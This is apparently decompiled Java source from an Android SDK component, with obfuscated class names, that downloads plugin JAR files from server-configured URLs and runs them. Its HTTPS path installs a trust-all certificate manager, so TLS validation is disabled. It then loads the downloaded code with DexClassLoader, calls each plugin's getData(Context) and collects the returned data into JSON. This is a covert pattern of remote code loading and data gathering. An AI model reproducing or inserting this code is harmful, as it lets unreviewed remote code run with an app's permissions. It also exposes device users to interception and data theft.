package com.bgjd.ici.p029d;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.util.Log;
import android.webkit.URLUtil;
import com.bgjd.ici.json.JSONArray;
import com.bgjd.ici.json.JSONException;
import com.bgjd.ici.json.JSONObject;
import com.bgjd.ici.p025b.C1395h;
import com.bgjd.ici.p025b.C1409k;
import com.bgjd.ici.p025b.ac;
import com.bgjd.ici.p030e.C1485h.C1484a;
import com.github.lzyzsd.jsbridge.BridgeUtil;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.List;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

@SuppressLint({"NewApi"})
public class C1473p extends C1409k<JSONObject> {
    TrustManager[] f2339f;

    class C14691 implements X509TrustManager {
        final /* synthetic */ C1473p f2328a;

        C14691(C1473p c1473p) {
            this.f2328a = c1473p;
        }

        public void checkClientTrusted(X509Certificate[] x509CertificateArr, String str) throws CertificateException {
        }

        public void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) throws CertificateException {
        }

        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }

    private interface C1470a {
        boolean mo2328a();
    }

    private class C1471b implements C1470a {
        final /* synthetic */ C1473p f2329a;
        private String f2330b = "";
        private String f2331c = "";
        private String f2332d = "";
        private String f2333e = "";

        public C1471b(C1473p c1473p, String str, String str2, String str3, String str4) {
            this.f2329a = c1473p;
            this.f2330b = str;
            this.f2332d = str2;
            this.f2333e = str3;
            this.f2331c = str4;
        }

        public boolean mo2328a() {
            HttpURLConnection httpURLConnection;
            IOException iOException;
            Throwable th;
            if (this.f2329a.a.mo2222c(this.f2331c).equalsIgnoreCase(this.f2332d)) {
                return true;
            }
            HttpURLConnection httpURLConnection2 = null;
            try {
                httpURLConnection = (HttpURLConnection) new URL(this.f2330b).openConnection();
                try {
                    if (httpURLConnection.getResponseCode() == 200) {
                        String headerField = httpURLConnection.getHeaderField("Content-Disposition");
                        if (headerField != null) {
                            int indexOf = headerField.indexOf("filename=");
                            if (indexOf > 0) {
                                this.f2331c = headerField.substring(indexOf + 10, headerField.length() - 1);
                            }
                        } else {
                            this.f2331c = this.f2330b.substring(this.f2330b.lastIndexOf(BridgeUtil.SPLIT_MARK) + 1, this.f2330b.length());
                        }
                        InputStream inputStream = httpURLConnection.getInputStream();
                        File file = new File(this.f2329a.a.getContext().getFilesDir(), this.f2331c);
                        if (file.exists()) {
                            file.delete();
                        }
                        FileOutputStream openFileOutput = this.f2329a.a.getContext().openFileOutput(this.f2331c, 0);
                        byte[] bArr = new byte[4096];
                        while (true) {
                            int read = inputStream.read(bArr);
                            if (read == -1) {
                                break;
                            }
                            openFileOutput.write(bArr, 0, read);
                        }
                        openFileOutput.close();
                        inputStream.close();
                        if (this.f2333e.length() <= 0) {
                            if (httpURLConnection != null) {
                                httpURLConnection.disconnect();
                            }
                            return true;
                        } else if (ac.m2863a(this.f2333e, file)) {
                            if (httpURLConnection != null) {
                                httpURLConnection.disconnect();
                            }
                            return true;
                        }
                    }
                    if (httpURLConnection != null) {
                        httpURLConnection.disconnect();
                    }
                } catch (MalformedURLException e) {
                    if (httpURLConnection != null) {
                        httpURLConnection.disconnect();
                    }
                    return false;
                } catch (IOException e2) {
                    httpURLConnection2 = httpURLConnection;
                    iOException = e2;
                    try {
                        Log.i("MKT", iOException.getMessage());
                        if (httpURLConnection2 != null) {
                            httpURLConnection2.disconnect();
                        }
                        return false;
                    } catch (Throwable th2) {
                        th = th2;
                        if (httpURLConnection2 != null) {
                            httpURLConnection2.disconnect();
                        }
                        throw th;
                    }
                } catch (Throwable th3) {
                    httpURLConnection2 = httpURLConnection;
                    th = th3;
                    if (httpURLConnection2 != null) {
                        httpURLConnection2.disconnect();
                    }
                    throw th;
                }
            } catch (MalformedURLException e3) {
                httpURLConnection = null;
                if (httpURLConnection != null) {
                    httpURLConnection.disconnect();
                }
                return false;
            } catch (IOException e4) {
                iOException = e4;
                Log.i("MKT", iOException.getMessage());
                if (httpURLConnection2 != null) {
                    httpURLConnection2.disconnect();
                }
                return false;
            }
            return false;
        }
    }

    private class C1472c implements C1470a {
        final /* synthetic */ C1473p f2334a;
        private String f2335b = "";
        private String f2336c = "";
        private String f2337d = "";
        private String f2338e = "";

        public C1472c(C1473p c1473p, String str, String str2, String str3, String str4) {
            this.f2334a = c1473p;
            this.f2335b = str;
            this.f2337d = str2;
            this.f2338e = str3;
            this.f2336c = str4;
        }

        public boolean mo2328a() {
            IOException iOException;
            Throwable th;
            NoSuchAlgorithmException noSuchAlgorithmException;
            KeyManagementException keyManagementException;
            HttpsURLConnection httpsURLConnection = null;
            if (this.f2334a.a.mo2222c(this.f2334a.b).equalsIgnoreCase(this.f2337d)) {
                return true;
            }
            HttpsURLConnection httpsURLConnection2;
            try {
                SSLContext instance = SSLContext.getInstance("TLS");
                instance.init(null, this.f2334a.f2339f, null);
                HttpsURLConnection.setDefaultSSLSocketFactory(instance.getSocketFactory());
                httpsURLConnection2 = (HttpsURLConnection) new URL(this.f2335b).openConnection();
                try {
                    if (httpsURLConnection2.getResponseCode() == 200) {
                        String headerField = httpsURLConnection2.getHeaderField("Content-Disposition");
                        if (headerField != null) {
                            int indexOf = headerField.indexOf("filename=");
                            if (indexOf > 0) {
                                this.f2336c = headerField.substring(indexOf + 10, headerField.length() - 1);
                            }
                        } else {
                            this.f2336c = this.f2335b.substring(this.f2335b.lastIndexOf(BridgeUtil.SPLIT_MARK) + 1, this.f2335b.length());
                        }
                        InputStream inputStream = httpsURLConnection2.getInputStream();
                        File file = new File(this.f2334a.a.getContext().getFilesDir(), this.f2336c);
                        if (file.exists()) {
                            file.delete();
                        }
                        FileOutputStream openFileOutput = this.f2334a.a.getContext().openFileOutput(this.f2336c, 0);
                        byte[] bArr = new byte[4096];
                        while (true) {
                            int read = inputStream.read(bArr);
                            if (read == -1) {
                                break;
                            }
                            openFileOutput.write(bArr, 0, read);
                        }
                        openFileOutput.close();
                        inputStream.close();
                        if (this.f2338e.length() <= 0) {
                            if (httpsURLConnection2 != null) {
                                httpsURLConnection2.disconnect();
                            }
                            return true;
                        } else if (ac.m2863a(this.f2338e, file)) {
                            if (httpsURLConnection2 != null) {
                                httpsURLConnection2.disconnect();
                            }
                            return true;
                        }
                    }
                    if (httpsURLConnection2 != null) {
                        httpsURLConnection2.disconnect();
                    }
                } catch (MalformedURLException e) {
                    if (httpsURLConnection2 != null) {
                        httpsURLConnection2.disconnect();
                    }
                    return false;
                } catch (IOException e2) {
                    httpsURLConnection = httpsURLConnection2;
                    iOException = e2;
                    try {
                        Log.i("MKT", iOException.getMessage());
                        if (httpsURLConnection != null) {
                            httpsURLConnection.disconnect();
                        }
                        return false;
                    } catch (Throwable th2) {
                        th = th2;
                        if (httpsURLConnection != null) {
                            httpsURLConnection.disconnect();
                        }
                        throw th;
                    }
                } catch (NoSuchAlgorithmException e3) {
                    httpsURLConnection = httpsURLConnection2;
                    noSuchAlgorithmException = e3;
                    Log.i("MKT", noSuchAlgorithmException.getMessage());
                    if (httpsURLConnection != null) {
                        httpsURLConnection.disconnect();
                    }
                    return false;
                } catch (KeyManagementException e4) {
                    httpsURLConnection = httpsURLConnection2;
                    keyManagementException = e4;
                    Log.i("MKT", keyManagementException.getMessage());
                    if (httpsURLConnection != null) {
                        httpsURLConnection.disconnect();
                    }
                    return false;
                } catch (Throwable th3) {
                    httpsURLConnection = httpsURLConnection2;
                    th = th3;
                    if (httpsURLConnection != null) {
                        httpsURLConnection.disconnect();
                    }
                    throw th;
                }
            } catch (MalformedURLException e5) {
                httpsURLConnection2 = null;
                if (httpsURLConnection2 != null) {
                    httpsURLConnection2.disconnect();
                }
                return false;
            } catch (IOException e6) {
                iOException = e6;
                Log.i("MKT", iOException.getMessage());
                if (httpsURLConnection != null) {
                    httpsURLConnection.disconnect();
                }
                return false;
            } catch (NoSuchAlgorithmException e7) {
                noSuchAlgorithmException = e7;
                Log.i("MKT", noSuchAlgorithmException.getMessage());
                if (httpsURLConnection != null) {
                    httpsURLConnection.disconnect();
                }
                return false;
            } catch (KeyManagementException e8) {
                keyManagementException = e8;
                Log.i("MKT", keyManagementException.getMessage());
                if (httpsURLConnection != null) {
                    httpsURLConnection.disconnect();
                }
                return false;
            }
            return false;
        }
    }

    public /* synthetic */ Object mo2325d() {
        return m3059f();
    }

    public C1473p(C1395h c1395h) {
        super(c1395h);
        this.f2339f = new TrustManager[]{new C14691(this)};
        this.b = "sdk-plugin";
    }

    public JSONObject m3059f() {
        JSONObject jSONObject = new JSONObject();
        Object jSONArray = new JSONArray();
        try {
            JSONArray q = this.a.mo2281q();
            if (q != null && q.length() > 0) {
                for (int i = 0; i < q.length(); i++) {
                    JSONObject jSONObject2 = q.getJSONObject(i);
                    if (jSONObject2 != null && jSONObject2.has("name") && jSONObject2.has(C1484a.f2398e) && jSONObject2.has("url")) {
                        Object string = jSONObject2.getString("version");
                        Object string2 = jSONObject2.getString("name");
                        String string3 = jSONObject2.getString(C1484a.f2398e);
                        String string4 = jSONObject2.getString(C1484a.f2396c);
                        String string5 = jSONObject2.getString("url");
                        int i2 = jSONObject2.getInt(C1484a.f2400g);
                        int i3 = jSONObject2.getInt("id");
                        int i4 = jSONObject2.getInt("type");
                        long f = this.a.mo2233f(string3);
                        if (f <= 0 || i2 <= 0 || (Calendar.getInstance().getTimeInMillis() - f) / 86400000 < ((long) i2)) {
                            C1470a c1472c;
                            if (URLUtil.isHttpsUrl(string5)) {
                                c1472c = new C1472c(this, string5, string, string4, string2);
                            } else {
                                c1472c = new C1471b(this, string5, string, string4, string2);
                            }
                            if (c1472c.mo2328a()) {
                                this.a.mo2208a((String) string2, (String) string);
                                if (i4 == 0) {
                                    File file = new File(this.a.getContext().getFilesDir(), string2 + ".jar");
                                    try {
                                        Class loadClass = new DexClassLoader(file.getAbsolutePath(), this.a.getContext().getDir("dex", 0).getAbsolutePath(), null, getClass().getClassLoader()).loadClass(string3);
                                        Object newInstance = loadClass.newInstance();
                                        Method method = loadClass.getMethod("getData", new Class[]{Context.class});
                                        if (newInstance != null) {
                                            Object invoke = method.invoke(newInstance, new Object[]{this.a.getContext()});
                                            if (invoke != null) {
                                                newInstance = new JSONObject();
                                                newInstance.put("a", string);
                                                newInstance.put("b", string2);
                                                newInstance.put("c", i3);
                                                newInstance.put("d", invoke);
                                                jSONArray.put(newInstance);
                                                if (f == 0) {
                                                    this.a.mo2206a(string3, System.currentTimeMillis());
                                                }
                                            }
                                        }
                                    } catch (ClassNotFoundException e) {
                                    } catch (NoSuchMethodException e2) {
                                    } catch (InstantiationException e3) {
                                    } catch (IllegalAccessException e4) {
                                    } catch (IllegalArgumentException e5) {
                                    } catch (InvocationTargetException e6) {
                                    }
                                } else if (i4 == 1) {
                                    try {
                                        List<ActivityInfo> arrayList = new ArrayList(Arrays.asList(this.a.getContext().getPackageManager().getPackageInfo(this.a.getContext().getPackageName(), 1).activities));
                                        if (arrayList != null) {
                                            for (ActivityInfo activityInfo : arrayList) {
                                                if (activityInfo.name.contains("MarketEula")) {
                                                }
                                            }
                                        }
                                    } catch (NameNotFoundException e7) {
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (JSONException e8) {
        }
        try {
            jSONObject.put("a", jSONArray);
            jSONObject.put("b", jSONArray.length());
            jSONObject.put("c", System.currentTimeMillis());
        } catch (JSONException e9) {
        }
        return jSONObject;
    }
}
